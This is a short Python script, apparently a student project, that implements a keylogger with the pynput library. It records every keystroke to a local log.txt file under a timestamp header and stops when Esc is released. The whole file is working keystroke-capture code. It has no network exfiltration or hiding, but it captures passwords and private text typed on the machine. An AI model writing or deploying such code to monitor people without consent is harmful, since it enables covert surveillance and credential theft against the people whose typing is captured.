"""
@author	Swapnil Mali	B.Tech Information Technology
"""

from pynput.keyboard import Key, Listener
from datetime import datetime

#opening log file in append mode
fp = open('log.txt', '+a')

#current date and time
log_time = datetime.now()

#starting every log neatly
fp.write('\n\n\n')
fp.write('------------------------------ Timestamp:' + str(log_time) + '------------------------------')
fp.write('\n\n')

#array of special keys to avoid mess in log file by ignoring them
special_keys = [Key.esc, Key.alt_l, Key.alt_r,Key.up,Key.down, Key.shift, Key.shift_l,
                Key.caps_lock, Key.ctrl, Key.backspace, Key.insert, Key.page_down,
                Key.page_up, Key.alt, Key.tab, Key.home, Key.end, Key.print_screen,
                Key.shift_r, Key.ctrl_l, Key.ctrl_r]


#decides what to write in log file after pressing a key
def on_press(key):
    if key == Key.space:
        fp.write(' ')
    elif key == Key.enter:
        fp.write('\n')
    elif key in special_keys:
        fp.write('.')
    else:
        fp.write(str(key).replace("'", ""))

#on pressing esc key logger stops
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press= on_press, on_release= on_release) as listner:
    listner.join()